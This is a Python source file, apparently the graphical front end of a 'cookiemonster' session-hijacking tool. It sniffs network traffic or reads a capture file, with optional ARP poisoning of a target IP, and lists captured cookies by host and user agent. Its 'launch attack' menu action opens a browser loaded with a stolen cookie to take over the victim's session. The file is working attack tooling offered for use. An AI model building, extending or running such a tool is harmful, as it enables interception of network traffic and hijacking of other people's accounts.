#!/usr/bin/python
# -*- coding: iso-8859-1 -*-
#this bitch is GPL
import sys, subprocess, urllib, time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
from PyQt4.QtNetwork import *
import thread
from MonsterCore import MonsterCore
from multiprocessing import Queue, Pipe, Process
from subprocess import Popen
import getopt
from ModelUtil import CookieModel
import re
import os
import platform
from MacMonsterCore import MacMonsterCore

class MonsterGui(QObject):
    def __init__(self):
        super(MonsterGui,self).__init__()
        self.cookieWidget = QTreeView()
        self.cookieWidget.setContextMenuPolicy(Qt.CustomContextMenu)
        self.actions = [QAction("launch attack",self.cookieWidget),]
        self.connect(self.actions[0], SIGNAL("triggered()"),self.launchAttack)
        self.connect(self.cookieWidget, SIGNAL("customContextMenuRequested(QPoint)"),self.showMenu)
        self.model = CookieModel()
        self.cookieWidget.setModel(self.model)

    def initGui(self):
        self.cookieWidget.resize(800,600)
        self.cookieWidget.show()
        
    def showMenu(self,point):
        index = self.cookieWidget.indexAt(point)
        if index.isValid() and self.cookieWidget.model().nodeFromIndex(index).isUA():
            QMenu.exec_(self.actions,self.cookieWidget.mapToGlobal(point))
    
    def incoming(self,infos,cookie,ua):
        self.model.addCookie(infos, cookie,ua)
        self.cookieWidget.expandAll()
    
    def launchAttack(self):
        index = self.cookieWidget.selectedIndexes()[0]
        model = self.cookieWidget.model()
        ua = model.data(index)
        cookie = model.data(index.parent())
        host = model.data(index.parent().parent())
        
        Popen(["python","MonsterBrowser.py","-u",ua,"-c",cookie,host])
        
        #self.Monster.attack(host,cookie,ua)
    def usage(self):
        print """
    Usage: python cookiemonster.py [options] [capture source]
    
    Options:
        -a  --arp <IP>        Perform ARP poisoning on IP (in progress)
    
    File / Interface
        -i --interface <interface>    Choose specified interface
        -f --file <filename>         Choose specified filename
        -c --channel <channel>      Choose specified channel (For Mac OS X only)
        """
        
    def getArguments(self,argv):
        try:
            opts, args = getopt.getopt(argv, "a:i:f:c:", ["arp=", "interface=", "file=","channel="])
        except getopt.GetoptError:
            self.usage()
            sys.exit(2)    
            
        check = False
        
        filename = False
        interface = False
        arp_target = False
        channel = 1

        for opt, args in opts:    
                if opt in ("-f", "--file"):
                    filename = args
                    
                if opt in ("-i", "--interface"):
                    interface = args
                
                if opt in ("-a", "--arp"):
                    arp_target = args
                    if not self.validateIP(args):
                        print "Please enter a valid IP address"
                        sys.exit(2)
                if opt in ("-c", "--channel"):
                    channel = args

        if not interface and not filename:
            self.usage()
            sys.exit(2)

        if interface and filename:
            print "ERROR: You cannot specify a filename AND an interface"
            self.usage()
            sys.exit(2)
            
        if platform.system() == "Darwin":
            #mac os x
            print "Mac OS X detected, switching to workaround using airpcap"
            if channel is None:
                print "ERROR: Must specify channel on Mac OS X"
                sys.exit(2)

            self.Monster = MacMonsterCore(filename, interface, arp_target, channel)    
        else:
            self.Monster = MonsterCore(filename, interface, arp_target)

        self.connect(self.Monster,SIGNAL("cookieFound"),self.incoming)
        self.Monster.start()
    

if __name__=="__main__":
    app = QApplication(sys.argv)
    monster = MonsterGui()
    monster.getArguments(sys.argv[1:])
    monster.initGui()
    app.exec_()